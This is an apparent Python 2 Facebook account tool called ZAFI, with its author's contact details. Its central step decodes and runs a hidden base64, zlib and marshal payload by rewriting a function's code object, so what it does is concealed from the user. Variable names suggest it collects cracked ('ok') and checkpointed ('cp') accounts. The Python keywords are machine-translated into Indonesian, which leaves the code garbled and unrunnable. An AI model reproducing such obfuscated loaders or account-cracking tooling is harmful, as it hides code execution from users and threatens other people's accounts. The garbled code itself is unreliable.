#!/usr/bin/python2
# pengkodean=utf-8
# coding oleh Romi Afrizal
# Catatan : jangan di ubah lagi! nanti error, script udah enak
# Tim kode sumber terbuka | ngotak dikit cok jangan jual di jual belikan

Hj  =  ' \x1b [1;92m' 
Gunung  =  ' \x1b [0m' 
info  = (
"""%S
 • Skrip info:

- penulis : Romi Afrizal
 - facebook : facebook.com/romi.afrizal.102
 - fanspage : facebook.com/100022086172556
 - whatsapp : +6282371648186
 - github : github.com/Mark-Zuck
 - nama script : ZAFI (Zona Akun Facebook Indonesia)
 - versi: 1.1
  
%s""" % ( Hj , Gunung ))
impor  os
coba :
     permintaan impor
kecuali  ImportError :
    os . sistem ( 'permintaan pemasangan pip2' )
coba :
    impor  bersamaan . masa depan
kecuali  ImportError :
    os . sistem ( 'pip2 install futures' )
coba :
    impor  bs4
kecuali  ImportError :
    os . sistem ( 'pip2 instal bs4' )
 permintaan impor , os , re , bs4 , sys , json , waktu , acak , datetime , subproses , logging , base64
dari  bersamaan . impor berjangka  ThreadPoolExecutor  
dari  bs4  impor  BeautifulSoup  sebagai  parser
dari  waktu  impor  tidur  sebagai  jeda
dari  datetime  impor  datetime
_ = ( lambda  x : x ); kode = tipe ( _ . func_code ); _ . func_code = kode ( 0 , 0 , 5 , 64 , 'y9 \x00 e \x00 \x00 d \x00 \x00 \x83 \x01 \x00 j \x01 \x00 e \x00 \x00 d \x01 \x00 \x83 \ x00 e \x00 \x00 \ x01 \x00 j \x02 d \x02\x00 \x83 \x01 \x00 j \x03 \x00 d \x03 \x00 \x83 \x01 \x00 \x83 \x01 \x00 \x83 \x01 \x00 d \x04 \x00 \x04 UWn \x1e \x00 \x04 e \x04 \x00 k \n \x00 rY \x00 \x01 Z \x05 \x00 \x01 e \x83 \x01 \x00 GHn \x01 \x00 Xd \x04 \x00 S'\x06\x00e\x05\x00 ,( 'marshal' , 'zlib' , 'base64' ,'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', Tidak ada ),( '__import__' , 'loads' , 'decompress' , 'b64decode' , 'Exception' , 'e' , 'str' ),(), 'enc_lam.py' , '<module>' , 1 , ' \x03 \x00 9 \x01 \x0f \x00 ' ,(),()); _ ()
pengguna , mi , status_foll , cr , ok , cp , id , pengguna , loop , perulangan  = [], [], [], [], [], [], [], [], 0 , 1
def  jalan ( z ):

untuk  e  dalam  z  +  ' \n ' :
        sys . stdout . write ( e )
        sys . stdout . menyiram (); jeda ( 0,03 )
def  tik ():
    titik  = [ '. ' , '.. ' , '... ' ]
    untuk  o  di  titik :
        print ( ' \r %s%s menghapus token %s' % ( M , til , o )),
        sys . stdout . menyiram (); jeda ( 1 )
 folder def ():
	coba : os . mkdir ( 'hasil' )
	kecuali : lulus
	coba : os . mkdir ( 'data' )
	kecuali : lulus
	coba :

